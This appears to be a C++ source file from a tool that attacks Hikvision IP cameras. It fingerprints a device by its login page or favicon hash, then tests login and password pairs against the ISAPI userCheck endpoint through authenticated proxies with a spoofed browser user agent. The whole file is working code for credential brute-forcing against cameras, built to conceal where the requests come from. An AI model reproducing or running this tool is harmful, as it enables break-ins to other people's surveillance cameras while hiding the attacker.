#include "network.hpp"
#include <cpr/api.h>
#include <cpr/cprtypes.h>
#include <cpr/response.h>
#include <cpr/timeout.h>
#include <iomanip>
#include <ios>
#include <iostream>
#include <openssl/md5.h>
#include <sstream>

const std::string user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36";
constexpr std::string_view url_template = "http://{}:{}/ISAPI/Security/userCheck";
constexpr std::string_view proxy_template = "http://{}:{}";

namespace network {
    bool sendRequest(
        const InetAddr& addr,
        const Proxy& proxy,
        const std::string& login,
        const std::string& password
    ) {
        std::string url = std::format(url_template, addr.ip, addr.port);
        std::string proxyUrl = std::format(proxy_template, proxy.addr.ip, proxy.addr.port);

        cpr::Response response = cpr::Get(
            cpr::Url{url},
            cpr::Authentication{login, password, cpr::AuthMode::BASIC},
            cpr::Header{{"Connection", "close"}, {"User-Agent", user_agent}},
            cpr::Proxies{{"http", proxyUrl}},
            cpr::ProxyAuthentication{{
                "http",
                cpr::EncodedAuthentication{
                    proxy.creds.username,
                    proxy.creds.password
                }
            }},
            cpr::Timeout({10000})
        );

        if (response.status_code == 200 &&
            response.text.find("userCheck") != std::string::npos &&
            response.text.find("statusValue") != std::string::npos &&
            response.text.find("200") != std::string::npos
        ) return true;

        return false;
    }

    std::string md5(const std::string &value) {
        unsigned char hash[MD5_DIGEST_LENGTH];

        MD5(reinterpret_cast<const unsigned char*>(value.c_str()), value.size(), hash);

        std::ostringstream sout;
        sout << std::hex << std::setfill('0');
        for (unsigned char c : hash)
            sout << std::setw(2) << static_cast<int>(c);

        return sout.str();
    }

    bool checkHikvision(const InetAddr &addr) {
        std::string url = std::format(proxy_template, addr.ip, addr.port);

        cpr::Response r = cpr::Get(
            cpr::Url{url},
            cpr::Header{{"Connection", "close"}, {"User-Agent", user_agent}},
            cpr::Timeout({5000})
        );

        if (r.text.find("doc/page/login.asp") != std::string::npos)
            return true;

        url += "/favicon.ico";
        r = cpr::Get(
            cpr::Url{url},
            cpr::Header{{"Connection", "close"}, {"User-Agent", user_agent}},
            cpr::Timeout({5000})
        );

        if (md5(r.text) == "89b932fcc47cf4ca3faadb0cfdef89cf")
            return true;

        return false;
    }
}
